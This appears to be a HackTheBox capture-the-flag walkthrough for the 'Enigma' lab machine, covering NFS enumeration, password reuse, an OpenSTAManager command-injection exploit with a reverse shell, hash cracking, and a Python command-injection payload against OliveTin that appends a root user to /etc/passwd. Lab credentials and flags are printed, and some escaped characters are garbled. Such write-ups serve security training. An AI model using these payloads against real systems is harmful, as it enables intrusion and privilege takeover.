<img width="948" height="521" alt="image" src="https://github.com/user-attachments/assets/2eff321e-6cc6-46b9-bdf9-1d952764daad" />

 # HackTheBox: Enigma Walkthrough

**Difficulty:** Easy (Felt like Medium)  
**OS:** Linux  
**Target IP:** \10.129.239.191\

---

## Overview & Execution Summary

Enigma presents an engaging multi-step attack path that goes far beyond standard web enumeration. Gaining root access requires discovering an open NFS share, tracing reused credentials across internal webmail systems, leveraging a known open-source management platform vulnerability, cracking a bcrypt password hash, and exploiting an internal administrative automation tool.

---

## 1. Reconnaissance & Initial Enumeration

### Port Scanning
A thorough network scan reveals standard administrative ports alongside mail services and network file sharing:
* **22** — SSH
* **80 / 443** — HTTP / HTTPS web servers
* **110 / 995** — POP3 / POP3S
* **143 / 993** — IMAP / IMAPS
* **2049** — NFS (Network File System)

### NFS Export Analysis
Checking available network shares exposes an unconstrained configuration:
\\\ash
showmount -e 10.129.239.191
\\\
The \/srv/nfs/onboarding\ export allows anonymous mounting (\*\), providing immediate access to internal files:
\\\ash
mkdir -p /mnt/onboarding
mount -t nfs 10.129.239.191:/srv/nfs/onboarding /mnt/onboarding -o nolock
\\\
Inside the share, \New_Employee_Access.pdf\ discloses staff names, notably listing **Kevin Mitchell** in operations and hints regarding corporate accounts.

---

## 2. Webmail Access & Credential Harvesting

The document points toward \mail001.enigma.htb\, hosting a Roundcube webmail portal. Testing Kevin's onboarding credentials (\Enigma2024!\) successfully grants access to his inbox. 

While Kevin's mailbox contains only a welcome note from HR (\sarah@enigma.htb\), recognizing pattern-based onboarding passwords allows applying the exact same credential (\Enigma2024!\) to Sarah's account. Sarah's mailbox leaks administrative credentials for the support portal.

---

## 3. Subdomain Discovery & Initial Access

### Vhost Fuzzing
Fuzzing virtual hosts reveals the primary operational panel:
\\\ash
ffuf -u http://10.129.239.191 -H "Host: FUZZ.enigma.htb" -w subdomains-top1million-5000.txt -fs 0
\\\
This uncovers \support_001.enigma.htb\, running **OpenSTAManager 2.9.8**.

### Exploiting CVE-2025-69212
Using the administrative credentials harvested from webmail (\dmin\ / \Ne3s4rtars78s\), we target an OS command injection flaw within OpenSTAManager's P7M file handler (\decodeP7M\). 

1. Run the exploit validation check to resolve correct module and plugin IDs (discovered as module \15\ and plugin \19\):
   \\\ash
   python3 exploit.py -t 'http://support_001.enigma.htb' -u admin -p 'Ne3s4rtars78s' --check
   \\\
2. Fire the payload to catch a reverse shell via Netcat as \www-data\.
3. Standardize the shell environment using Python PTY spawning and \stty\ configurations to ensure stability.

---

## 4. Horizontal Pivot (\www-data\ $\rightarrow$ \haris\) & User Flag

Inspecting the application configuration reveals database connection parameters:
\\\ash
cat /var/www/html/openstamanager/config.inc.php
\\\
* **User:** \rollin\
* **Password:** \Fri3nds@9099\

Connecting to the local MySQL database exposes the application user accounts:
\\\ash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username, password FROM zz_users;"
\\\
This dumps a bcrypt hash for user \haris\. Cracking the hash using John the Ripper and the standard \
ockyou.txt\ dictionary yields the plaintext password:
\\\ash
john --format=bcrypt --wordlist=rockyou.txt haris.hash
\\\
* **Cracked Password:** \estfriends\

Switching user contexts (\su - haris\) successfully logs us in as \haris\, allowing us to read the user flag:
\\\ash
cat user.txt
\\\
* **User Flag:** \29fd4674cd6a9f9bd95fdda945e9fbcf\

---

## 5. Vertical Privilege Escalation (\haris\ $\rightarrow$ \
oot\)

### Internal Service Discovery
Checking local sockets reveals an internal service bound to the loopback interface:
\\\ash
ss -tulnp
\\\
An instance of **OliveTin** runs on \127.0.0.1:1337\ executing tasks as \
oot\. 

### Interacting with the OliveTin API
API reconnaissance indicates that recent versions of OliveTin require the \indingId\ parameter rather than legacy keys. The \ackup_database\ binding executes a \mysqldump\ command where parameters are improperly escaped.

Using a Python script to target \http://127.0.0.1:1337/api/StartAction\, we inject a base64-encoded payload to bypass shell character limitations and append a new privileged user (\pwn\) into \/etc/passwd\:

\\\python
import json, base64, urllib.request

line = "pwn:\\\\\\./:0:0:root:/root:/bin/bash\\n"
b64 = base64.b64encode(line.encode()).decode()
inject = "x'; echo %s | base64 -d >> /etc/passwd #" % b64

payload = {
    "bindingId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "root"},
        {"name": "db_pass", "value": inject},
        {"name": "db_name", "value": "production"}
    ]
}

req = urllib.request.Request(
    "http://127.0.0.1:1337/api/StartAction",
    data=json.dumps(payload).encode(),
    headers={"Content-Type": "application/json"}
)
print(urllib.request.urlopen(req).read().decode())
\\\

### Capturing Root
With the user successfully appended, we elevate privileges and read the final flag:
\\\ash
su - pwn
# Password: 12345
cat /root/root.txt
\\\
* **Root Flag:** \328e50b0ecbe954da4143eb0d26e01ae\

---

## 6. Attack Chain Diagram

\\\	ext
Port scan
  └─ NFS /srv/nfs/onboarding
       └─ New_Employee_Access.pdf
            └─ Kevin Mitchell (Enigma2024!) → Roundcube mailbox
                 └─ same password reused → Sarah's mailbox
                      └─ admin creds leaked in email
                           └─ support_001 → OpenSTAManager 2.9.8 → admin session

Exploit chain
  └─ CVE-2025-69212 → RCE as www-data
       ├─ config.inc.php → brollin:Fri3nds@9099
       ├─ zz_users dump → haris hash → crack → "bestfriends"
       └─ su - haris → user.txt

Local enum as haris
  └─ OliveTin @ 127.0.0.1:1337 (running as root)
       └─ /api/StartAction  bindingId=backup_database  arg=db_pass
            └─ Command injection → /etc/passwd append
                 └─ su - pwn:12345 → root.txt
\\\

---

## 7. Lessons Learned

* **Wildcard NFS Exports:** Leaving shares open via \*\ exposes internal structure documents like onboarding PDFs that serve as initial reconnaissance maps.
* **Autogenerated Passwords:** Poor template entropy across onboarding accounts leads directly to credential reuse chains across multiple users.
* **Subdomain Discovery:** Decoy landing pages on primary domains make thorough vhost enumeration mandatory.
* **Instance-Specific Exploits:** Blindly trusting hardcoded module or plugin IDs in PoCs will cause failures; always run availability/check modes first.
* **Privileged Automation Tools:** Internal convenience panels like OliveTin running as root require the same rigorous input sanitization as user-facing web services.

---

## 8. Tools Used

* \
map\
* \showmount\ / NFS client utilities
* \fuf\ (Virtual host fuzzing)
* Roundcube Webmail
* CVE-2025-69212 PoC exploit script
* Netcat (\
c\)
* MySQL client
* John the Ripper (\crypt\ mode with \
ockyou.txt\)
* Python 3 (\urllib\, \ase64\, \json\)

---

## Summary of Credentials

| Account / Context | Credential / Hash | Source |
| :--- | :--- | :--- |
| **Kevin Mitchell** | \Enigma2024!\ | NFS Onboarding PDF |
| **Sarah (HR)** | \Enigma2024!\ | Reused onboarding template |
| **OSM Admin** | \Ne3s4rtars78s\ | Sarah's webmail inbox |
| **MySQL (\rollin\)** | \Fri3nds@9099\ | \config.inc.php\ |
| **Haris** | \estfriends\ (bcrypt cracked) | MySQL \zz_users\ dump |
| **Root (\pwn\)** | \12345\ | OliveTin command injection |
